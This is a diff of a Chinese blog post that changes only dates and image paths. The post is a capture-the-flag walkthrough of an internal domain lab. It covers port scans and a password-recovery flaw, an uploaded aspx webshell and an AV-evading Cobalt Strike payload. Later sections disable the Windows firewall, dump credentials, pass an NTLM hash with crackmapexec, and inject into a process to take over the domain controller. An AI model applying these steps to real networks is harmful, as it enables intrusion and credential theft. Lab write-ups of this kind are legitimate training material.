@@ -180,8 +180,8 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fas fa-edit"></i>&nbsp;
-        <span class="pc">2023-07-16 13:50:30</span>
-        <span class="mobile">2023-07-16 13:50</span>
+        <span class="pc">2023-09-16 13:50:30</span>
+        <span class="mobile">2023-09-16 13:50</span>
     </span>
     
         <span class="article-categories article-meta-item">
@@ -236,69 +236,69 @@
         
 
         <div class="article-content markdown-body">
-            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/07/16/attack/image-20240113161520059.png" alt="image-20240113161520059"></p>
+            <h1 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h1><h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="/2023/09/16/attack/image-20240113161520059.png" alt="image-20240113161520059"></p>
 <p>PS：该靶场作者：<a class="link" target="_blank" rel="noopener" href="https://www.moonsec.com/">暗月<i class="fas fa-external-link-alt"></i></a></p>
 <h2 id="HOSTS设置"><a href="#HOSTS设置" class="headerlink" title="HOSTS设置"></a>HOSTS设置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cat</span> /etc/hosts</span><br><span class="line">127.0.0.1	localhost</span><br><span class="line">127.0.1.1	kali</span><br><span class="line">::1		localhost ip6-localhost ip6-loopback</span><br><span class="line">ff02::1		ip6-allnodes</span><br><span class="line">ff02::2		ip6-allrouters</span><br><span class="line"><span class="comment"># 4-attack</span></span><br><span class="line">192.168.0.204 www.moonlab.com</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161533516.png" alt="image-20240113161533516"></p>
+<p><img src="/2023/09/16/attack/image-20240113161533516.png" alt="image-20240113161533516"></p>
 <h1 id="WEB服务器"><a href="#WEB服务器" class="headerlink" title="WEB服务器"></a>WEB服务器</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nmap -sT -sV -O 192.168.0.204</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) </span><br><span class="line">Nmap scan report <span class="keyword">for</span> www.moonlab.com (192.168.0.204)</span><br><span class="line">Host is up (0.0018s latency).</span><br><span class="line">Not shown: 997 filtered tcp ports (no-response)</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">21/tcp  open  ftp     Microsoft ftpd</span><br><span class="line">80/tcp  open  http    Microsoft IIS httpd 10.0</span><br><span class="line">999/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">MAC Address: 00:0C:29:36:38:42 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2016|2012 (98%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2016 (98%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (92%), Microsoft Windows Server 2012 R2 (89%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 27.89 seconds</span><br></pre></td></tr></table></figure>
 
 <h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;www.moonlab.com&quot;</span>              </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.2</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/.dirsearch/reports/www.moonlab.com.txt</span><br><span class="line"></span><br><span class="line">Error Log: /home/kali/.dirsearch/logs/errors.log</span><br><span class="line"></span><br><span class="line">Target: http://www.moonlab.com/</span><br><span class="line">403   312B   http://www.moonlab.com:80/%2e%2e//google.com</span><br><span class="line">200   410B   http://www.moonlab.com:80/0.php</span><br><span class="line">200   407B   http://www.moonlab.com:80/58</span><br><span class="line">200   407B   http://www.moonlab.com:80/59</span><br><span class="line">200   406B   http://www.moonlab.com:80/6</span><br><span class="line">200   410B   http://www.moonlab.com:80/6.php</span><br><span class="line">200   414B   http://www.moonlab.com:80/ADMIN.jsp</span><br><span class="line">403   312B   http://www.moonlab.com:80/\..\..\..\..\..\..\..\..\..\etc\passwd</span><br><span class="line">200   415B   http://www.moonlab.com:80/app.config</span><br><span class="line">200   424B   http://www.moonlab.com:80/bitrix/import/files</span><br><span class="line">200   425B   http://www.moonlab.com:80/bitrix/import/import</span><br><span class="line">301   155B   http://www.moonlab.com:80/contents    -&gt; REDIRECTS TO: http://www.moonlab.com/contents/</span><br><span class="line">301   154B   http://www.moonlab.com:80/include    -&gt; REDIRECTS TO: http://www.moonlab.com/include/</span><br><span class="line">200     0B   http://www.moonlab.com:80/index.htm</span><br><span class="line">200   266B   http://www.moonlab.com:80/readme.txt</span><br><span class="line">200    84B   http://www.moonlab.com:80/robots.txt</span><br><span class="line">301   157B   http://www.moonlab.com:80/SiteServer    -&gt; REDIRECTS TO: http://www.moonlab.com/SiteServer/</span><br><span class="line">301   155B   http://www.moonlab.com:80/template    -&gt; REDIRECTS TO: http://www.moonlab.com/template/</span><br><span class="line">200     7KB  http://www.moonlab.com:80/umbraco/webservices/codeEditorSave.asmx</span><br><span class="line">301   153B   http://www.moonlab.com:80/upload    -&gt; REDIRECTS TO: http://www.moonlab.com/upload/</span><br><span class="line">200     5B   http://www.moonlab.com:80/version.txt</span><br></pre></td></tr></table></figure>
 
-<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><img src="/2023/07/16/attack/image-20240113161547141.png" alt="image-20240113161547141"></p>
+<h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p><img src="/2023/09/16/attack/image-20240113161547141.png" alt="image-20240113161547141"></p>
 <h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h3><p>问题参数为空时，可显示密码。</p>
-<p><img src="/2023/07/16/attack/image-20240113161614299.png" alt="image-20240113161614299"></p>
+<p><img src="/2023/09/16/attack/image-20240113161614299.png" alt="image-20240113161614299"></p>
 <p>上传压缩后的Behider的aspx马。</p>
-<p><img src="/2023/07/16/attack/image-20240113161626997.png" alt="image-20240113161626997"></p>
+<p><img src="/2023/09/16/attack/image-20240113161626997.png" alt="image-20240113161626997"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.moonlab.com/sitefiles/sitetemplates/c/c.aspx</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161635952.png" alt="image-20240113161635952"></p>
+<p><img src="/2023/09/16/attack/image-20240113161635952.png" alt="image-20240113161635952"></p>
 <h3 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h3><p><a class="link" target="_blank" rel="noopener" href="https://github.com/1y0n/AV_Evasion_Tool">AV_Evasion_Tool<i class="fas fa-external-link-alt"></i></a></p>
 <p>生成pyload.c，使用掩日生成反向马。</p>
-<p><img src="/2023/07/16/attack/image-20240113161643838.png" alt="image-20240113161643838"></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="SpoolSystem-Inject"><a href="#SpoolSystem-Inject" class="headerlink" title="SpoolSystem Inject"></a>SpoolSystem Inject</h3><p><img src="/2023/07/16/attack/image-20240113161653728.png" alt="image-20240113161653728"></p>
-<p><img src="/2023/07/16/attack/image-20240113161659711.png" alt="image-20240113161659711"></p>
+<p><img src="/2023/09/16/attack/image-20240113161643838.png" alt="image-20240113161643838"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="SpoolSystem-Inject"><a href="#SpoolSystem-Inject" class="headerlink" title="SpoolSystem Inject"></a>SpoolSystem Inject</h3><p><img src="/2023/09/16/attack/image-20240113161653728.png" alt="image-20240113161653728"></p>
+<p><img src="/2023/09/16/attack/image-20240113161659711.png" alt="image-20240113161659711"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell va.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161708723.png" alt="image-20240113161708723"></p>
+<p><img src="/2023/09/16/attack/image-20240113161708723.png" alt="image-20240113161708723"></p>
 <p>导出明文</p>
-<p><img src="/2023/07/16/attack/image-20240113161715432.png" alt="image-20240113161715432"></p>
-<h1 id="OA服务器"><a href="#OA服务器" class="headerlink" title="OA服务器"></a>OA服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2023/07/16/attack/image-20240113161724576.png" alt="image-20240113161724576"></p>
+<p><img src="/2023/09/16/attack/image-20240113161715432.png" alt="image-20240113161715432"></p>
+<h1 id="OA服务器"><a href="#OA服务器" class="headerlink" title="OA服务器"></a>OA服务器</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="/2023/09/16/attack/image-20240113161724576.png" alt="image-20240113161724576"></p>
 <h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Host is up (1.2s latency).</span><br><span class="line">Not shown: 995 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    nginx</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">|_http-title: \xCD\xA8\xB4\xEFOA\xCD\xF8\xC2\xE7\xD6\xC7\xC4\xDC\xB0\xEC\xB9\xAB\xCF\xB5\xCD\xB3</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/</span><br><span class="line">49152/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">49156/tcp open  msrpc   Microsoft Windows RPC</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4775.10 seconds</span><br></pre></td></tr></table></figure>
 
 <h2 id="漏洞测试-1"><a href="#漏洞测试-1" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><p>80端口为通达OA，利用通达OA漏洞检测工具拿到shell。</p>
-<p><img src="/2023/07/16/attack/image-20240113161736672.png" alt="image-20240113161736672"></p>
-<p><img src="/2023/07/16/attack/image-20240113161743373.png" alt="image-20240113161743373"></p>
+<p><img src="/2023/09/16/attack/image-20240113161736672.png" alt="image-20240113161736672"></p>
+<p><img src="/2023/09/16/attack/image-20240113161743373.png" alt="image-20240113161743373"></p>
 <p>蚁剑直接连接：</p>
-<p><img src="/2023/07/16/attack/image-20240113161752940.png" alt="image-20240113161752940"></p>
-<p><img src="/2023/07/16/attack/image-20240113161759201.png" alt="image-20240113161759201"></p>
+<p><img src="/2023/09/16/attack/image-20240113161752940.png" alt="image-20240113161752940"></p>
+<p><img src="/2023/09/16/attack/image-20240113161759201.png" alt="image-20240113161759201"></p>
 <p>cs生成正向马，执行后connect 没反应，查看进程，正向马正常运行。存在防火墙，将防火墙关闭。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NetSh Advfirewall <span class="built_in">set</span> allprofiles state off</span><br></pre></td></tr></table></figure>
 
 <p>关闭后成功上上线：</p>
-<p><img src="/2023/07/16/attack/image-20240113161808118.png" alt="image-20240113161808118"></p>
+<p><img src="/2023/09/16/attack/image-20240113161808118.png" alt="image-20240113161808118"></p>
 <p>明文抓取，拿到了域控啥的Hash。</p>
-<p><img src="/2023/07/16/attack/image-20240113161815195.png" alt="image-20240113161815195"></p>
+<p><img src="/2023/09/16/attack/image-20240113161815195.png" alt="image-20240113161815195"></p>
 <h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>定位域控信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br><span class="line">shell net time /domain</span><br><span class="line">shell ping dc.attack.local</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161822559.png" alt="image-20240113161822559"></p>
-<p><img src="/2023/07/16/attack/image-20240113161829022.png" alt="image-20240113161829022"></p>
+<p><img src="/2023/09/16/attack/image-20240113161822559.png" alt="image-20240113161822559"></p>
+<p><img src="/2023/09/16/attack/image-20240113161829022.png" alt="image-20240113161829022"></p>
 <h2 id="CS横向移动PsExec"><a href="#CS横向移动PsExec" class="headerlink" title="CS横向移动PsExec"></a>CS横向移动PsExec</h2><p>OA服务器到密码的时候拿到了域管理员的Hash，但是正向上线失败，在OA服务器上创建监听，反向上线成功。</p>
-<p><img src="/2023/07/16/attack/image-20240113161837040.png" alt="image-20240113161837040"></p>
+<p><img src="/2023/09/16/attack/image-20240113161837040.png" alt="image-20240113161837040"></p>
 <h2 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h2><p>可以通过CME测试Hash的正确性。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 10.10.12.165 -u administrator -H <span class="string">&#x27;15132c3d36a7e5d7905e02b478979046&#x27;</span> -x <span class="built_in">whoami</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161845466.png" alt="image-20240113161845466"></p>
+<p><img src="/2023/09/16/attack/image-20240113161845466.png" alt="image-20240113161845466"></p>
 <h2 id="进程注入横向移动"><a href="#进程注入横向移动" class="headerlink" title="进程注入横向移动"></a>进程注入横向移动</h2><p>注入ATTACK\administrator 进程，拿到域管权限的会话。</p>
-<p><img src="/2023/07/16/attack/image-20240113161853188.png" alt="image-20240113161853188"></p>
+<p><img src="/2023/09/16/attack/image-20240113161853188.png" alt="image-20240113161853188"></p>
 <p>使用注入后的会话，选择使用会话当前的访问令牌横向移动。</p>
-<p><img src="/2023/07/16/attack/image-20240113161900026.png" alt="image-20240113161900026"></p>
+<p><img src="/2023/09/16/attack/image-20240113161900026.png" alt="image-20240113161900026"></p>
 <p>成功上线，拿到域控机器。</p>
-<p><img src="/2023/07/16/attack/image-20240113161906914.png" alt="image-20240113161906914"></p>
+<p><img src="/2023/09/16/attack/image-20240113161906914.png" alt="image-20240113161906914"></p>
 <h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">type</span> C:\Users\Administrator\flag.txt</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2023/07/16/attack/image-20240113161913918.png" alt="image-20240113161913918"></p>
+<p><img src="/2023/09/16/attack/image-20240113161913918.png" alt="image-20240113161913918"></p>
 
         </div>
 
@@ -329,7 +329,7 @@
                     <div class="article-next">
                         <a class="next"
                            rel="next"
-                           href="/2023/07/13/webhack123/"
+                           href="/2023/09/13/webhack123/"
                         >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">完整内网域靶场-webhack123</span>
